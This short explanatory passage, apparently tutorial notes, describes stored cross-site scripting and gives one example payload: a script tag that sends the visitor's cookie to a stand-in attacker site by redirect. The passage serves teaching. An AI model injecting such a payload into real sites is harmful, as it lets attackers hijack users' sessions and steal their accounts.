The first example of an attack is the Cross Site Scripting attack (XSS). This is allows the attacker to insert a JS         <Script> tag into a form. When the browser renders the html in the public post, the browser will automatically execute the JS. 

For example, if you were to type
   <script> window.location= 'http://www.someattacksite.com/?cookie='+document.cookie </script>

The browser will render the message, send the user to the attack page, and will steal their cookie for that site. Normally, one cannot steal a users cookie, but since the original site has been the one to redirect, the browser considers it to be an original part of the site.